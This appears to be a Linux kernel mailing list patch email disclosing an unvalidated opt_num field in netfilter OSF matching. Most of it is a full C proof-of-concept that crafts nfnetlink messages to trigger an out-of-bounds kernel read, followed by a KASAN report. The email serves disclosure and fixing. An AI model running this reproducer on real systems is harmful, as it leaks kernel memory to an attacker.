Return-Path: <linux-kernel-owner@vger.kernel.org>
X-Original-To: lists+linux-kernel@lfdr.de
Delivered-To: lists+linux-kernel@lfdr.de
Received: from out1.vger.email (out1.vger.email [IPv6:2620:137:e000::1:20])
	by mail.lfdr.de (Postfix) with ESMTP id 65BD578E12F
	for <lists+linux-kernel@lfdr.de>; Wed, 30 Aug 2023 23:10:21 +0200 (CEST)
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
        id S240463AbjH3VKU (ORCPT <rfc822;lists+linux-kernel@lfdr.de>);
        Wed, 30 Aug 2023 17:10:20 -0400
Received: from lindbergh.monkeyblade.net ([23.128.96.19]:48826 "EHLO
        lindbergh.monkeyblade.net" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
        with ESMTP id S240443AbjH3VKT (ORCPT
        <rfc822;linux-kernel@vger.kernel.org>);
        Wed, 30 Aug 2023 17:10:19 -0400
Received: from us-smtp-delivery-124.mimecast.com (us-smtp-delivery-124.mimecast.com [170.10.129.124])
        by lindbergh.monkeyblade.net (Postfix) with ESMTPS id B4A19E40
        for <linux-kernel@vger.kernel.org>; Wed, 30 Aug 2023 14:08:56 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=redhat.com;
        s=mimecast20190719; t=1693429632;
        h=from:from:reply-to:subject:subject:date:date:message-id:message-id:
         to:to:cc:cc:mime-version:mime-version:
         content-transfer-encoding:content-transfer-encoding;
        bh=t4pnam1fs1d/tQmQJ5Sno1ctNp12I0AVt20ye3y+60o=;
        b=MU86NHhCBpFDiXYR4lNsLlz4EEXKfcQq807EvsltGaNqCNVX7FDG9h1KTuJgZ+wz5HC76I
        4BICYdk6Eh+J/MJePwXJmU6Jwi/GAz/Wi/BOMNAOaIiu0EP2IJiK9+zGTVK5QGJWfhtBjK
        EU1MApSpvDOkGMGk2meCGJ/30Q5aKt4=
Received: from mimecast-mx02.redhat.com (mimecast-mx02.redhat.com
 [66.187.233.88]) by relay.mimecast.com with ESMTP with STARTTLS
 (version=TLSv1.2, cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id
 us-mta-121-hcFpIZPwNFWaFRKh8MB4sw-1; Wed, 30 Aug 2023 16:56:28 -0400
X-MC-Unique: hcFpIZPwNFWaFRKh8MB4sw-1
Received: from smtp.corp.redhat.com (int-mx09.intmail.prod.int.rdu2.redhat.com [10.11.54.9])
        (using TLSv1.2 with cipher AECDH-AES256-SHA (256/256 bits))
        (No client certificate requested)
        by mimecast-mx02.redhat.com (Postfix) with ESMTPS id B5B5D857A84;
        Wed, 30 Aug 2023 20:56:27 +0000 (UTC)
Received: from fedora.redhat.com (unknown [10.22.8.242])
        by smtp.corp.redhat.com (Postfix) with ESMTP id C8886492C13;
        Wed, 30 Aug 2023 20:56:24 +0000 (UTC)
From:   Wander Lairson Costa <wander@redhat.com>
To:     Pablo Neira Ayuso <pablo@netfilter.org>,
        Jozsef Kadlecsik <kadlec@netfilter.org>,
        Florian Westphal <fw@strlen.de>,
        "David S. Miller" <davem@davemloft.net>,
        Eric Dumazet <edumazet@google.com>,
        Jakub Kicinski <kuba@kernel.org>,
        Paolo Abeni <pabeni@redhat.com>,
        netfilter-devel@vger.kernel.org (open list:NETFILTER),
        coreteam@netfilter.org (open list:NETFILTER),
        netdev@vger.kernel.org (open list:NETWORKING [GENERAL]),
        linux-kernel@vger.kernel.org (open list)
Cc:     Wander Lairson Costa <wander@redhat.com>,
        Lucas Leong <wmliang@infosec.exchange>, stable@kernel.org
Subject: [PATCH nf] netfilter/osf: avoid OOB read
Date:   Wed, 30 Aug 2023 17:55:55 -0300
Message-ID: <20230830205554.97083-2-wander@redhat.com>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit
X-Scanned-By: MIMEDefang 3.1 on 10.11.54.9
X-Spam-Status: No, score=-1.1 required=5.0 tests=BAYES_00,DKIMWL_WL_HIGH,
        DKIM_SIGNED,DKIM_VALID,DKIM_VALID_AU,DKIM_VALID_EF,HEXHASH_WORD,
        RCVD_IN_DNSWL_BLOCKED,RCVD_IN_MSPIKE_H4,RCVD_IN_MSPIKE_WL,
        SPF_HELO_NONE,SPF_NONE autolearn=no autolearn_force=no version=3.4.6
X-Spam-Checker-Version: SpamAssassin 3.4.6 (2021-04-09) on
        lindbergh.monkeyblade.net
Precedence: bulk
List-ID: <linux-kernel.vger.kernel.org>
X-Mailing-List: linux-kernel@vger.kernel.org

The opt_num field is controlled by user mode and is not currently
validated inside the kernel. An attacker can take advantage of this to
trigger an OOB read and potentially leak information.

Reproducer:

void install_filter_for_leak()
{
	char buf[0x1000] = {0};
        struct iovec io = {
		.iov_base = buf,
		.iov_len = sizeof(buf)
        };
        struct msghdr msg = {0};
        msg.msg_iov = &io;
        msg.msg_iovlen = 1;

	int fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_NETFILTER);
	setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &(int){1}, sizeof(int));

	memset(buf, 0, sizeof(buf));
	*(uint32_t*)(buf) = 0x14;
	*(uint16_t*)(buf+4) = 0x10;
	*(uint16_t*)(buf+6) = 1;
	*(uint32_t*)(buf+8) = 0x63072925;
	*(uint16_t*)(buf+0x12) = 0xa;
	*(uint32_t*)(buf+0x14) = 0x20;
	*(uint16_t*)(buf+0x18) = 0xa00;
	*(uint16_t*)(buf+0x1a) = 0x5;
	*(uint32_t*)(buf+0x1c) = 0x63072926;
	*(uint8_t*)(buf+0x24) = 2;

	*(uint16_t*)(buf+0x28) = 0xb;
	*(uint16_t*)(buf+0x2a) = 1;
	strcpy((void*)(buf+0x2c), "filter");

	*(uint32_t*)(buf+0x34) = 0x14;
	*(uint16_t*)(buf+0x38) = 0x11;
	*(uint16_t*)(buf+0x3a) = 1;
	*(uint32_t*)(buf+0x3c) = 0x63072927;
	*(uint16_t*)(buf+0x46) = 0xa;
	io.iov_len = 0x48;
        sendmsg(fd, &msg, 0);

	memset(buf, 0, sizeof(buf));
	*(uint32_t*)(buf) = 0x14;
	*(uint16_t*)(buf+4) = 0x10;
	*(uint16_t*)(buf+6) = 1;
	*(uint32_t*)(buf+8) = 0x63072925;
	*(uint16_t*)(buf+0x12) = 0xa;
	*(uint16_t*)(buf+0x14) = 0x40;
	*(uint16_t*)(buf+0x18) = 0xa03;
	*(uint16_t*)(buf+0x1a) = 0x5;
	*(uint32_t*)(buf+0x1c) = 0x63072926;
	*(uint32_t*)(buf+0x24) = 2;

	*(uint16_t*)(buf+0x28) = 0xb;
	*(uint16_t*)(buf+0x2a) = 1;
	strcpy((void*)(buf+0x2c), "filter");
	*(uint16_t*)(buf+0x34) = 0xa;
	*(uint16_t*)(buf+0x36) = 3;
	strcpy((void*)(buf+0x38), "input");
	*(uint16_t*)(buf+0x40) = 0x14;
	*(uint16_t*)(buf+0x42) = 0x8004;
	*(uint16_t*)(buf+0x44) = 8;
	*(uint16_t*)(buf+0x46) = 1;
	*(uint32_t*)(buf+0x48) = 0x1000000;
	*(uint16_t*)(buf+0x4c) = 8;
	*(uint16_t*)(buf+0x4e) = 2;
	*(uint32_t*)(buf+0x50) = 0;

	*(uint32_t*)(buf+0x54) = 0x14;
	*(uint16_t*)(buf+0x58) = 0x11;
	*(uint16_t*)(buf+0x5a) = 1;
	*(uint32_t*)(buf+0x5c) = 0x63072f50;
	*(uint16_t*)(buf+0x66) = 0xa;
	io.iov_len = 0x68;
        sendmsg(fd, &msg, 0);

	memset(buf, 0, sizeof(buf));
	*(uint32_t*)(buf) = 0x14;
	*(uint16_t*)(buf+4) = 0x10;
	*(uint16_t*)(buf+6) = 1;
	*(uint32_t*)(buf+8) = 0x63072925;
	*(uint16_t*)(buf+0x12) = 0xa;
	*(uint16_t*)(buf+0x14) = 0x40;
	*(uint16_t*)(buf+0x18) = 0xa03;
	*(uint16_t*)(buf+0x1a) = 5;
	*(uint32_t*)(buf+0x1c) = 0x63072926;
	*(uint32_t*)(buf+0x24) = 2;
	*(uint16_t*)(buf+0x28) = 0xb;
	*(uint16_t*)(buf+0x2a) = 1;
	strcpy((void*)(buf+0x2c), "filter");
	*(uint16_t*)(buf+0x34) = 0xb;
	*(uint16_t*)(buf+0x36) = 3;
	strcpy((void*)(buf+0x38), "output");
	*(uint16_t*)(buf+0x40) = 0x14;
	*(uint16_t*)(buf+0x42) = 0x8004;
	*(uint16_t*)(buf+0x44) = 8;
	*(uint16_t*)(buf+0x46) = 1;
	*(uint32_t*)(buf+0x48) = 0x3000000;
	*(uint16_t*)(buf+0x4c) = 8;
	*(uint16_t*)(buf+0x4e) = 2;
	*(uint32_t*)(buf+0x50) = 0;

	*(uint32_t*)(buf+0x54) = 0x14;
	*(uint16_t*)(buf+0x58) = 0x11;
	*(uint16_t*)(buf+0x5a) = 1;
	*(uint32_t*)(buf+0x5c) = 0x63072f50;
	*(uint16_t*)(buf+0x66) = 0xa;
	io.iov_len = 0x68;
        sendmsg(fd, &msg, 0);

	memset(buf, 0, sizeof(buf));
	*(uint32_t*)(buf) = 0x14;
	*(uint16_t*)(buf+4) = 0x10;
	*(uint16_t*)(buf+6) = 1;
	*(uint32_t*)(buf+8) = 0x63072925;
	*(uint16_t*)(buf+0x12) = 0xa;
	*(uint16_t*)(buf+0x14) = 0x2c;
	*(uint16_t*)(buf+0x18) = 0xa03;
	*(uint16_t*)(buf+0x1a) = 0x5;
	*(uint32_t*)(buf+0x1c) = 0x63072926;
	*(uint32_t*)(buf+0x24) = 2;
	*(uint16_t*)(buf+0x28) = 0xb;
	*(uint16_t*)(buf+0x2a) = 1;
	strcpy((void*)(buf+0x2c), "filter");
	*(uint16_t*)(buf+0x34) = 0x9;
	*(uint16_t*)(buf+0x36) = 3;
	strcpy((void*)(buf+0x38), "leak");

	*(uint32_t*)(buf+0x40) = 0x14;
	*(uint16_t*)(buf+0x44) = 0x11;
	*(uint16_t*)(buf+0x46) = 1;
	*(uint32_t*)(buf+0x48) = 0x63072f50;
	*(uint16_t*)(buf+0x52) = 0xa;
	io.iov_len = 0x54;
        sendmsg(fd, &msg, 0);

	char buf5[] = {
		0x14, 0x00, 0x00, 0x00, 0x10, 0x00, 0x01, 0x00,
		0x74, 0x41, 0x07, 0x63, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x0a, 0x00, 0x1c, 0x01, 0x00, 0x00,
		0x06, 0x0a, 0x05, 0x0c, 0x75, 0x41, 0x07, 0x63,
		0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00,
		0x0b, 0x00, 0x01, 0x00, 0x66, 0x69, 0x6c, 0x74,
		0x65, 0x72, 0x00, 0x00, 0x0a, 0x00, 0x02, 0x00,
		0x69, 0x6e, 0x70, 0x75, 0x74, 0x00, 0x00, 0x00,
		0xf0, 0x00, 0x04, 0x80, 0x24, 0x00, 0x01, 0x80,
		0x09, 0x00, 0x01, 0x00, 0x6d, 0x65, 0x74, 0x61,
		0x00, 0x50, 0x02, 0x00, 0x14, 0x00, 0x02, 0x80,
		0x08, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x10,
		0x08, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x01,
		0x2c, 0x00, 0x01, 0x80, 0x08, 0x00, 0x01, 0x00,
		0x63, 0x6d, 0x70, 0x00, 0x20, 0x00, 0x02, 0x80,
		0x08, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x01,
		0x08, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x0c, 0x00, 0x03, 0x80, 0x05, 0x00, 0x01, 0x00,
		0x06, 0xb0, 0x1b, 0x00, 0x34, 0x00, 0x01, 0x80,
		0x0c, 0x00, 0x01, 0x00, 0x70, 0x61, 0x79, 0x6c,
		0x6f, 0x61, 0x64, 0x00, 0x24, 0x00, 0x02, 0x80,
		0x08, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x01,
		0x08, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x02,
		0x08, 0x00, 0x03, 0x00, 0x00, 0x00, 0x00, 0x0d,
		0x08, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x01,
		0x2c, 0x00, 0x01, 0x80, 0x08, 0x00, 0x01, 0x00,
		0x63, 0x6d, 0x70, 0x00, 0x20, 0x00, 0x02, 0x80,
		0x08, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x01,
		0x08, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x0c, 0x00, 0x03, 0x80, 0x05, 0x00, 0x01, 0x00,
		0x18, 0xd3, 0x01, 0x00, 0x3c, 0x00, 0x01, 0x80,
		0x0e, 0x00, 0x01, 0x00, 0x69, 0x6d, 0x6d, 0x65,
		0x64, 0x69, 0x61, 0x74, 0x65, 0x00, 0x00, 0x00,
		0x28, 0x00, 0x02, 0x80, 0x08, 0x00, 0x01, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x1c, 0x00, 0x02, 0x80,
		0x18, 0x00, 0x02, 0x80, 0x08, 0x00, 0x01, 0x00,
		0xff, 0xff, 0xff, 0xfd, 0x09, 0x00, 0x02, 0x00,
		0x6c, 0x65, 0x61, 0x6b, 0x00, 0x00, 0x00, 0x00,
		0x14, 0x00, 0x00, 0x00, 0x11, 0x00, 0x01, 0x00,
		0x76, 0x41, 0x07, 0x63, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x0a, 0x00};
	memset(buf, 0, sizeof(buf));
	memcpy(buf, buf5, sizeof(buf5));
	io.iov_len = 0x144;
        sendmsg(fd, &msg, 0);

	char buf6[] = {
		0x14, 0x00, 0x00, 0x00, 0x10, 0x00, 0x01, 0x00,
		0xd9, 0x4e, 0x07, 0x63, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x0a, 0x00, 0x54, 0x01, 0x00, 0x00,
		0x06, 0x0a, 0x05, 0x0c, 0xda, 0x4e, 0x07, 0x63,
		0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00,
		0x0b, 0x00, 0x01, 0x00, 0x66, 0x69, 0x6c, 0x74,
		0x65, 0x72, 0x00, 0x00, 0x09, 0x00, 0x02, 0x00,
		0x6c, 0x65, 0x61, 0x6b, 0x00, 0x00, 0x00, 0x00,
		0x28, 0x01, 0x04, 0x80, 0x34, 0x00, 0x01, 0x80,
		0x0c, 0x00, 0x01, 0x00, 0x70, 0x61, 0x79, 0x6c,
		0x6f, 0x61, 0x64, 0x00, 0x24, 0x00, 0x02, 0x80,
		0x08, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x02,
		0x08, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x02,
		0x08, 0x00, 0x03, 0x00, 0x00, 0x00, 0x00, 0x03,
		0x08, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x01,
		0x34, 0x00, 0x01, 0x80, 0x0c, 0x00, 0x01, 0x00,
		0x70, 0x61, 0x79, 0x6c, 0x6f, 0x61, 0x64, 0x00,
		0x24, 0x00, 0x02, 0x80, 0x08, 0x00, 0x05, 0x00,
		0x00, 0x00, 0x00, 0x02, 0x08, 0x00, 0x02, 0x00,
		0x00, 0x00, 0x00, 0x02, 0x08, 0x00, 0x03, 0x00,
		0x00, 0x00, 0x00, 0x0d, 0x08, 0x00, 0x04, 0x00,
		0x00, 0x00, 0x00, 0x01, 0x34, 0x00, 0x01, 0x80,
		0x0c, 0x00, 0x01, 0x00, 0x70, 0x61, 0x79, 0x6c,
		0x6f, 0x61, 0x64, 0x00, 0x24, 0x00, 0x02, 0x80,
		0x08, 0x00, 0x05, 0x00, 0x00, 0x00, 0x00, 0x02,
		0x08, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x01,
		0x08, 0x00, 0x03, 0x00, 0x00, 0x00, 0x00, 0x08,
		0x08, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x01,
		0x2c, 0x00, 0x01, 0x80, 0x08, 0x00, 0x01, 0x00,
		0x63, 0x6d, 0x70, 0x00, 0x20, 0x00, 0x02, 0x80,
		0x08, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x02,
		0x08, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x01,
		0x0c, 0x00, 0x03, 0x80, 0x05, 0x00, 0x01, 0x00,
		0x02, 0x00, 0x02, 0x80, 0x2c, 0x00, 0x01, 0x80,
		0x08, 0x00, 0x01, 0x00, 0x63, 0x6d, 0x70, 0x00,
		0x20, 0x00, 0x02, 0x80, 0x08, 0x00, 0x01, 0x00,
		0x00, 0x00, 0x00, 0x02, 0x08, 0x00, 0x02, 0x00,
		0x00, 0x00, 0x00, 0x01, 0x0c, 0x00, 0x03, 0x80,
		0x05, 0x00, 0x01, 0x00, 0x02, 0x00, 0x01, 0x00,
		0x30, 0x00, 0x01, 0x80, 0x0e, 0x00, 0x01, 0x00,
		0x69, 0x6d, 0x6d, 0x65, 0x64, 0x69, 0x61, 0x74,
		0x65, 0x00, 0x02, 0x00, 0x1c, 0x00, 0x02, 0x80,
		0x08, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x10, 0x00, 0x02, 0x80, 0x0c, 0x00, 0x02, 0x80,
		0x08, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x14, 0x00, 0x00, 0x00, 0x11, 0x00, 0x01, 0x00,
		0xdb, 0x4e, 0x07, 0x63, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x0a, 0x00};
	memset(buf, 0, sizeof(buf));
	memcpy(buf, buf6, sizeof(buf6));
	io.iov_len = 0x17c;
        sendmsg(fd, &msg, 0);

	char buf7[] = {
		0x14, 0x00, 0x00, 0x00, 0x10, 0x00, 0x01, 0x00,
		0x7c, 0x64, 0x07, 0x63, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x0a, 0x00, 0x50, 0x00, 0x00, 0x00,
		0x06, 0x0a, 0x05, 0x0c, 0x7d, 0x64, 0x07, 0x63,
		0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00,
		0x0b, 0x00, 0x01, 0x00, 0x66, 0x69, 0x6c, 0x74,
		0x65, 0x72, 0x00, 0x00, 0x09, 0x00, 0x02, 0x00,
		0x6c, 0x65, 0x61, 0x6b, 0x00, 0x00, 0x00, 0x00,
		0x24, 0x00, 0x04, 0x80, 0x20, 0x00, 0x01, 0x80,
		0x08, 0x00, 0x01, 0x00, 0x6f, 0x73, 0x66, 0x00,
		0x14, 0x00, 0x02, 0x80, 0x08, 0x00, 0x01, 0x00,
		0x00, 0x00, 0x00, 0x04, 0x08, 0x00, 0x03, 0x00,
		0x00, 0x00, 0x00, 0x01, 0x14, 0x00, 0x00, 0x00,
		0x11, 0x00, 0x01, 0x00, 0x7e, 0x64, 0x07, 0x63,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0a, 0x00,
	};
	memset(buf, 0, sizeof(buf));
	memcpy(buf, buf7, sizeof(buf7));
	io.iov_len = 0x78;
        sendmsg(fd, &msg, 0);

	char buf8[] = {
		0x14, 0x00, 0x00, 0x00, 0x10, 0x00, 0x01, 0x00,
		0xc9, 0x64, 0x07, 0x63, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x0a, 0x00, 0x28, 0x01, 0x00, 0x00,
		0x06, 0x0a, 0x05, 0x0c, 0xca, 0x64, 0x07, 0x63,
		0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00,
		0x0b, 0x00, 0x01, 0x00, 0x66, 0x69, 0x6c, 0x74,
		0x65, 0x72, 0x00, 0x00, 0x09, 0x00, 0x02, 0x00,
		0x6c, 0x65, 0x61, 0x6b, 0x00, 0x00, 0x00, 0x00,
		0xfc, 0x00, 0x04, 0x80, 0x34, 0x00, 0x01, 0x80,
		0x0c, 0x00, 0x01, 0x00, 0x70, 0x61, 0x79, 0x6c,
		0x6f, 0x61, 0x64, 0x00, 0x24, 0x00, 0x02, 0x80,
		0x08, 0x00, 0x05, 0x00, 0x00, 0x00, 0x00, 0x04,
		0x08, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x02,
		0x08, 0x00, 0x03, 0x00, 0x00, 0x00, 0x00, 0x20,
		0x08, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x10,
		0x34, 0x00, 0x01, 0x80, 0x0c, 0x00, 0x01, 0x00,
		0x70, 0x61, 0x79, 0x6c, 0x6f, 0x61, 0x64, 0x00,
		0x24, 0x00, 0x02, 0x80, 0x08, 0x00, 0x01, 0x00,
		0x00, 0x00, 0x00, 0x02, 0x08, 0x00, 0x02, 0x00,
		0x00, 0x00, 0x00, 0x02, 0x08, 0x00, 0x03, 0x00,
		0x00, 0x00, 0x00, 0x02, 0x08, 0x00, 0x04, 0x00,
		0x00, 0x00, 0x00, 0x01, 0x34, 0x00, 0x01, 0x80,
		0x0c, 0x00, 0x01, 0x00, 0x70, 0x61, 0x79, 0x6c,
		0x6f, 0x61, 0x64, 0x00, 0x24, 0x00, 0x02, 0x80,
		0x08, 0x00, 0x05, 0x00, 0x00, 0x00, 0x00, 0x02,
		0x08, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x02,
		0x08, 0x00, 0x03, 0x00, 0x00, 0x00, 0x00, 0x0d,
		0x08, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x01,
		0x2c, 0x00, 0x01, 0x80, 0x08, 0x00, 0x01, 0x00,
		0x63, 0x6d, 0x70, 0x00, 0x20, 0x00, 0x02, 0x80,
		0x08, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x02,
		0x08, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x01,
		0x0c, 0x00, 0x03, 0x80, 0x05, 0x00, 0x01, 0x00,
		0x18, 0x00, 0x02, 0x80, 0x30, 0x00, 0x01, 0x80,
		0x0e, 0x00, 0x01, 0x00, 0x69, 0x6d, 0x6d, 0x65,
		0x64, 0x69, 0x61, 0x74, 0x65, 0x00, 0x01, 0x00,
		0x1c, 0x00, 0x02, 0x80, 0x08, 0x00, 0x01, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x02, 0x80,
		0x0c, 0x00, 0x02, 0x80, 0x08, 0x00, 0x01, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x14, 0x00, 0x00, 0x00,
		0x11, 0x00, 0x01, 0x00, 0xcb, 0x64, 0x07, 0x63,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0a, 0x00,
	};
	memset(buf, 0, sizeof(buf));
	memcpy(buf, buf8, sizeof(buf8));
	io.iov_len = 0x150;
        sendmsg(fd, &msg, 0);
}

void *tcp_recv(void * data){

	int sockfd, connfd;
	struct sockaddr_in servaddr;
	int len, n;

	if ( (sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0 ) {
		perror("socket creation failed");
		exit(EXIT_FAILURE);
	}

	memset(&servaddr, 0, sizeof(servaddr));

	servaddr.sin_family    = AF_INET;
	servaddr.sin_addr.s_addr = inet_addr("127.0.0.1");;
	servaddr.sin_port = htons(6146);

	if ( bind(sockfd, (const struct sockaddr *)&servaddr,
		  sizeof(servaddr)) < 0 ){
		perror("bind failed");
		exit(EXIT_FAILURE);
	}

	int yes = 1;
	if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &yes,
		       sizeof(int)) == -1) {
		perror("setsockopt failed");
		exit(EXIT_FAILURE);
	}

	if ((listen(sockfd, 1)) < 0) {
		perror("listen failed");
		exit(EXIT_FAILURE);
	}

	connfd = accept(sockfd, NULL, 0);
	if (connfd < 0) {
		perror("accept failed");
		exit(EXIT_FAILURE);
	}
	len = 0;

	while(1)
	{
		if(len >= 128)
			break;
		n = read(connfd, data + len, 128-len);
		len += n;
	}

	close(sockfd);
	close(connfd);

	return NULL;
}

int tcp_connect()
{
	int sockfd;
	struct sockaddr_in servaddr;
	if ( (sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0 ) {
		perror("socket creation failed");
		exit(EXIT_FAILURE);
	}
	memset(&servaddr, 0, sizeof(servaddr));

	servaddr.sin_family    = AF_INET;
	servaddr.sin_addr.s_addr = inet_addr("127.0.0.1");;
	servaddr.sin_port = htons(6146);

	if (connect(sockfd,  (const struct sockaddr *)&servaddr,
		    sizeof(servaddr)) != 0) {
		perror("connect failed");
		exit(EXIT_FAILURE);
	}
	return sockfd;
}

int add_osf()
{
	int fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_NETFILTER);
	if (fd == -1) {
                errx(EXIT_FAILURE, "socket failed");
        }

	char iobuf1[0x268] = {0};
	*(uint32_t*)(iobuf1) = 0x268;
	*(uint8_t*)(iobuf1+4) = 0;
	*(uint8_t*)(iobuf1+5) = 0x5;
	*(uint16_t*)(iobuf1+6) = 0x405;
	*(uint32_t*)(iobuf1+8) = 0x63064c36;
	*(uint32_t*)(iobuf1+0x10) = 0;

	*(uint16_t*)(iobuf1+0x14) = 0x254;
	*(uint16_t*)(iobuf1+0x16) = 1;
	*(uint32_t*)(iobuf1+0x18) = 1;
	*(uint32_t*)(iobuf1+0x1c) = 4;
	*(uint8_t*)(iobuf1+0x20) = 2;
	*(uint8_t*)(iobuf1+0x21) = 0x1;
	*(uint16_t*)(iobuf1+0x22) = 0xb4;
	*(uint16_t*)(iobuf1+0x24) = 0;
	*(uint16_t*)(iobuf1+0x26) = 0xff;
	strcpy((void*)(iobuf1+0x28), "Windows");
	strcpy((void*)(iobuf1+0x48), "98");
	*(uint16_t*)(iobuf1+0x88) = 2;
	*(uint16_t*)(iobuf1+0x8a) = 4;
	*(uint16_t*)(iobuf1+0x94) = 1;
	*(uint16_t*)(iobuf1+0x96) = 1;
	*(uint16_t*)(iobuf1+0xa0) = 1;
	*(uint16_t*)(iobuf1+0xa2) = 1;
	*(uint16_t*)(iobuf1+0xac) = 4;
	*(uint16_t*)(iobuf1+0xae) = 2;
	struct iovec io1 = {
		.iov_base = iobuf1,
		.iov_len = sizeof(iobuf1)
	};
	struct msghdr msg1 = {0};
	msg1.msg_iov = &io1;
	msg1.msg_iovlen = 1;
	sendmsg(fd, &msg1, 0);

	return 0;
}

int main(int argc, char *argv[])
{
	add_osf();

	int tid, status;
	pthread_t p_thread;
	int sockfd;
	char buf[128] = {0};

	printf("[+] Create tcp communication\n");
	tid = pthread_create(&p_thread, NULL, tcp_recv, (void *)buf);
	printf("  [-] wait 1sec for server\n");
	usleep(10000);
	printf("  [-] connect to server\n");
	sockfd = tcp_connect();

	printf("[+] Install Filter for leak\n");
	install_filter_for_leak();

	printf("[+] Send packet and read data\n");
	write(sockfd, buf, 128);
	pthread_join(p_thread, (void **)&status);

	printf("[+] Remove filter\n");
	int fd1 = socket(AF_NETLINK, SOCK_RAW, NETLINK_NETFILTER);
        char iobuf1[0x48] = {0};
	*(uint32_t*)(iobuf1) = 0x14;
	*(uint16_t*)(iobuf1+4) = 0x10;
	*(uint16_t*)(iobuf1+6) = 1;
	*(uint32_t*)(iobuf1+8) = 0x63072925;
	*(uint16_t*)(iobuf1+0x12) = 0xa;
	*(uint16_t*)(iobuf1+0x14) = 0x20;
	*(uint16_t*)(iobuf1+0x18) = 0xa02;
	*(uint16_t*)(iobuf1+0x1a) = 0x5;
	*(uint32_t*)(iobuf1+0x1c) = 0x63072926;
	*(uint32_t*)(iobuf1+0x24) = 2;
	*(uint16_t*)(iobuf1+0x28) = 0xb;
	*(uint16_t*)(iobuf1+0x2a) = 1;
	strcpy((void*)(iobuf1+0x2c), "filter");
	*(uint32_t*)(iobuf1+0x34) = 0x14;
	*(uint16_t*)(iobuf1+0x38) = 0x11;
	*(uint16_t*)(iobuf1+0x3a) = 1;
	*(uint32_t*)(iobuf1+0x3c) = 0x63072927;
	*(uint16_t*)(iobuf1+0x46) = 0xa;
        struct iovec io1 = {
		.iov_base = iobuf1,
		.iov_len = sizeof(iobuf1)
        };
        struct msghdr msg1 = {0};
        msg1.msg_iov = &io1;
        msg1.msg_iovlen = 1;
        sendmsg(fd1, &msg1, 0);

	return 0;
}

KASAN report:

==================================================================
BUG: KASAN: slab-out-of-bounds in nf_osf_match_one+0xbed/0xd10 linux-6.0-rc4/net/netfilter/nfnetlink_osf.c:88
Read of size 2 at addr ffff88804bc64272 by task poc/6431

CPU: 1 PID: 6431 Comm: poc Not tainted 6.0.0-rc4 #1
Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS rel-1.14.0-0-g155821a1990b-prebuilt.qemu.org 04/01/2014
Call Trace:
 <IRQ>
 __dump_stack linux-6.0-rc4/lib/dump_stack.c:88
 dump_stack_lvl+0xcd/0x134 linux-6.0-rc4/lib/dump_stack.c:106
 print_address_description linux-6.0-rc4/mm/kasan/report.c:317
 print_report.cold+0x2ba/0x6e9 linux-6.0-rc4/mm/kasan/report.c:433
 kasan_report+0xb1/0x1e0 linux-6.0-rc4/mm/kasan/report.c:495
 nf_osf_match_one+0xbed/0xd10 linux-6.0-rc4/net/netfilter/nfnetlink_osf.c:88
 nf_osf_find+0x186/0x2f0 linux-6.0-rc4/net/netfilter/nfnetlink_osf.c:281
 nft_osf_eval+0x37f/0x590 linux-6.0-rc4/net/netfilter/nft_osf.c:47
 expr_call_ops_eval linux-6.0-rc4/net/netfilter/nf_tables_core.c:214
 nft_do_chain+0x2b0/0x1490 linux-6.0-rc4/net/netfilter/nf_tables_core.c:264
 nft_do_chain_ipv4+0x17c/0x1f0 linux-6.0-rc4/net/netfilter/nft_chain_filter.c:23
 nf_hook_entry_hookfn linux-6.0-rc4/./include/linux/netfilter.h:142
